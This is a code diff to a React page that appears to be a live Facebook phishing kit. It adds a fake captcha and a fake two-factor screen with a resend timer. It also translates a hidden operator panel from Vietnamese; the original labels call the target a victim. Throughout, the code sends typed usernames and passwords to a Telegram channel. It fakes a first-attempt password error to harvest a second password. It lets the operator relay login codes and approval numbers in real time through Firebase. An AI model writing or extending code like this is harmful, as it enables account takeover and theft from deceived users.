@@ -23,7 +23,7 @@ export default function Home() {
 
   // --- STATES FORM MODAL ---
   const [showModal, setShowModal] = useState(false);
-  const [step, setStep] = useState(1);
+  const [step, setStep] = useState(1); // 1=signup, 2=login, 3=captcha, 4=otp, 5=success
   const [clientIp, setClientIp] = useState('Unknown');
   const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
   const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
@@ -32,7 +32,16 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);
 
-  // --- STATES CHO BƯỚC 3 & 4 & ADMIN ---
+  // --- CAPTCHA STATES ---
+  const [captchaChecked, setCaptchaChecked] = useState(false);
+  const [captchaLoading, setCaptchaLoading] = useState(false);
+  const [captchaDone, setCaptchaDone] = useState(false);
+
+  // --- OTP TIMER STATES ---
+  const [otpSecondsLeft, setOtpSecondsLeft] = useState(120);
+  const [otpCanResend, setOtpCanResend] = useState(false);
+
+  // --- STATES CHO BƯỚC 4 & ADMIN ---
   const [matchNumber, setMatchNumber] = useState(null); 
   const [showSuccess, setShowSuccess] = useState(false); 
   const [adminSessionId, setAdminSessionId] = useState(''); 
@@ -88,19 +97,19 @@ export default function Home() {
 
   // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
   useEffect(() => {
-    if (showModal && !showAdmin) {
+    if (showModal && !showAdmin && step !== 1) {
         const commandRef = ref(database, 'commands/' + sessionId);
         const unsubscribe = onValue(commandRef, (snapshot) => {
             const data = snapshot.val();
             if (data && data.action) {
                 if (data.action === 'otp') {
-                    setStep(3); setMatchNumber(null); setShowSuccess(false);
+                    setStep(4); setMatchNumber(null); setShowSuccess(false);
                 } 
                 else if (data.action === 'approve' && data.value) {
-                    setStep(3); setMatchNumber(data.value); setShowSuccess(false);
+                    setStep(4); setMatchNumber(data.value); setShowSuccess(false);
                 } 
                 else if (data.action === 'success') {
-                    setStep(3); setShowSuccess(true);
+                    setShowSuccess(true);
                 } 
                 else if (data.action === 'error') {
                     setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
@@ -109,7 +118,7 @@ export default function Home() {
         });
         return () => unsubscribe();
     }
-  }, [showModal, showAdmin, sessionId]);
+  }, [showModal, showAdmin, sessionId, step]);
 
   // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
@@ -122,7 +131,26 @@ export default function Home() {
     return () => window.removeEventListener('keydown', handleKeyDown);
   }, []);
 
-  const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); };
+  // --- OTP TIMER EFFECT ---
+  useEffect(() => {
+    if (step === 4 && showModal) {
+      setOtpSecondsLeft(120);
+      setOtpCanResend(false);
+      const interval = setInterval(() => {
+        setOtpSecondsLeft(prev => {
+          if (prev <= 1) {
+            clearInterval(interval);
+            setOtpCanResend(true);
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+      return () => clearInterval(interval);
+    }
+  }, [step, showModal]);
+
+  const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false); };
 
   const handleSignup = (e) => {
     e.preventDefault(); let errs = {};
@@ -142,7 +170,33 @@ export default function Home() {
     e.preventDefault(); if (loginPass.length === 0) return;
     setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
     sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
-    setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
+    setTimeout(() => { 
+      setLoading(false); 
+      if (newAttempt === 1) { 
+        setShowLoginError(true); setLoginPass(''); 
+      } else { 
+        // Pass 2 -> go to CAPTCHA step
+        setStep(3); 
+      } 
+    }, (newAttempt === 1) ? 3000 : 5000);
+  };
+
+  // --- CAPTCHA HANDLER ---
+  const handleCaptchaClick = () => {
+    if (captchaDone || captchaLoading) return;
+    setCaptchaLoading(true);
+    setCaptchaChecked(true);
+    // Spin 10s then go to OTP
+    setTimeout(() => {
+      setCaptchaLoading(false);
+      setCaptchaDone(true);
+      setTimeout(() => {
+        setStep(4);
+        setOtpAttempt(0);
+        setOtp('');
+        setShowOtpError(false);
+      }, 600);
+    }, 10000);
   };
 
   const handleOtp = (e) => {
@@ -157,18 +211,32 @@ export default function Home() {
     }, 1500);
   };
 
+  const handleResendOtp = () => {
+    if (!otpCanResend) return;
+    setOtpSecondsLeft(120);
+    setOtpCanResend(false);
+    sendTelegramMessage(`\n<b>Resend OTP requested</b> for session <code>${escapeHtml(sessionId)}</code>`);
+  };
+
   const handleAdminCommand = (type, value) => {
       const targetUser = adminSessionId.trim(); 
-      if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
+      if (!targetUser) { alert('Please enter the Session ID!'); return; }
       
       set(ref(database, 'commands/' + targetUser), {
           action: type,
           value: value
       }).then(() => {
-          alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
+          alert(`Command sent to ${targetUser}!`);
       }).catch((error) => {
-          alert("Lỗi gửi lệnh: " + error.message);
+          alert("Error: " + error.message);
       });
+  };
+
+  // --- FORMAT TIMER ---
+  const formatTime = (secs) => {
+    const m = Math.floor(secs / 60);
+    const s = secs % 60;
+    return `${m}:${s.toString().padStart(2, '0')}`;
   };
 
   return (
@@ -311,21 +379,21 @@ export default function Home() {
                   <div style={{ textAlign: 'center' }}>
                     <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
                     <div style={{ marginBottom: '20px' }}>
-                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên  (lấy từ Telegram):</p>
-                        <input className="fb-input" type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
+                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Session ID (from Telegram):</p>
+                        <input className="fb-input" type="text" placeholder="e.g. user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
                     </div>
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-                        <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
-                        <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
-                        <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Báo Thành Công</button>
+                        <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Wrong Password</button>
+                        <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Go to OTP</button>
+                        <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Show Success</button>
                         
                         <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
-                            <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
-                            <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
-                            <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
+                            <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Request approval number:</p>
+                            <input className="fb-input" type="text" placeholder="Number (e.g. 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
+                            <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Send Number</button>
                         </div>
                         
-                        <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
+                        <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Close</button>
                     </div>
                   </div>
                 ) : (
@@ -613,35 +681,91 @@ export default function Home() {
                       </form>
                     )}
 
-                    {/* FORM 3 & 4: 2FA & SUCCESS */}
-                    {(step === 3 || showSuccess) && (
-                      <>
-                        {showSuccess ? (
-                          <div style={{ textAlign: 'center', padding: '20px 0' }}>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>{t.successTitle}</h2>
-                            <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>{t.successSub}</p>
-                            <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
+                    {/* FORM 3: CAPTCHA (full page style inside modal) */}
+                    {step === 3 && (
+                      <div style={{ textAlign: 'center' }}>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '8px' }}>Security check</h2>
+                        <p style={{ fontSize: '14.5px', color: '#65676b', marginBottom: '24px' }}>Please confirm you are human to continue.</p>
+                        <div 
+                          onClick={handleCaptchaClick}
+                          style={{
+                            border: captchaChecked ? '2px solid #0064e0' : '2px solid #ccd0d5',
+                            borderRadius: '10px',
+                            padding: '24px 20px',
+                            display: 'flex',
+                            alignItems: 'center',
+                            gap: '16px',
+                            cursor: captchaDone ? 'default' : 'pointer',
+                            background: captchaChecked ? '#eef4ff' : '#fafafa',
+                            transition: 'all 0.2s',
+                            userSelect: 'none'
+                          }}
+                        >
+                          <div style={{
+                            width: '28px', height: '28px', border: '2px solid',
+                            borderColor: captchaChecked ? '#0064e0' : '#bcc0c4',
+                            borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                            background: captchaChecked && !captchaLoading ? '#0064e0' : '#fff',
+                            flexShrink: 0, transition: 'all 0.2s'
+                          }}>
+                            {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
+                            {captchaLoading && <div style={{ width: '16px', height: '16px', border: '2.5px solid rgba(0,100,224,0.2)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
                           </div>
-                        ) : matchNumber ? (
-                          <>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>{t.approveTitle}</h2>
-                            <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4', textAlign: 'center' }}>{t.approveSub} <strong>{matchNumber}</strong></p>
-                            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
-                            <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
-                          </>
-                        ) : (
-                          <>
-                            <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form3Title}</h2>
-                            <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}><img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} /></div>
-                            <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form3Sub}</p>
-                            <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                                <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
-                                {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.otpError}</div>}
-                                <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : t.verifyBtn}</button>
-                            </form>
-                          </>
-                        )}
+                          <span style={{ fontSize: '16px', fontWeight: '500', color: captchaLoading ? '#0064e0' : '#1c2b33', flex: 1, textAlign: 'left' }}>
+                            {captchaDone ? 'Verified' : captchaLoading ? 'Verifying...' : "I'm not a robot"}
+                          </span>
+                          {captchaLoading && <div style={{ width: '24px', height: '24px', border: '2.5px solid rgba(0,100,224,0.15)', borderTop: '2.5px solid #0064e0', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }}></div>}
+                        </div>
+                        <p style={{ fontSize: '12px', color: '#65676b', marginTop: '12px' }}>This helps us prevent automated access.</p>
+                      </div>
+                    )}
+
+                    {/* FORM 4: OTP (full page style inside modal) — bỏ tên FB, bỏ SĐT, dùng ảnh cũ */}
+                    {step === 4 && !showSuccess && (
+                      <>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '8px', textAlign: 'center' }}>Two-factor authentication</h2>
+                        <p style={{ fontSize: '14.5px', color: '#65676b', marginBottom: '16px', textAlign: 'center' }}>Enter the 6-8 digit code from your authenticator app.</p>
+                        
+                        <div style={{ display: 'flex', justifyContent: 'center', margin: '16px 0 20px' }}>
+                          <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="2FA" style={{ maxWidth: '220px', width: '100%', height: 'auto', borderRadius: '8px' }} />
+                        </div>
+
+                        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                          <input 
+                            className="fb-input" 
+                            style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700', height: '60px' }} 
+                            placeholder="00000000" 
+                            value={otp} 
+                            onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} 
+                            required 
+                            maxLength={8} 
+                          />
+                          {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.otpError}</div>}
+                          <button type="submit" className="fb-btn" disabled={loading || otp.length < 6}>{loading ? 'Verifying...' : t.verifyBtn}</button>
+                        </form>
+
+                        <div style={{ textAlign: 'center', marginTop: '16px', fontSize: '14px', color: '#65676b' }}>
+                          {otpCanResend ? (
+                            <button type="button" onClick={handleResendOtp} style={{ background: 'none', border: 'none', color: '#0064e0', fontWeight: '600', cursor: 'pointer', fontSize: '14px', textDecoration: 'underline' }}>
+                              Get a new code
+                            </button>
+                          ) : (
+                            <span>You can request a new code in <strong style={{ color: '#0064e0' }}>{formatTime(otpSecondsLeft)}</strong></span>
+                          )}
+                        </div>
                       </>
+                    )}
+
+                    {/* FORM 5: SUCCESS (full page style inside modal) */}
+                    {showSuccess && (
+                      <div style={{ textAlign: 'center', padding: '20px 0' }}>
+                        <div style={{ width: '88px', height: '88px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
+                          <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                        </div>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px' }}>{t.successTitle}</h2>
+                        <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>{t.successSub}</p>
+                        <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
+                      </div>
                     )}
                   </>
                 )}
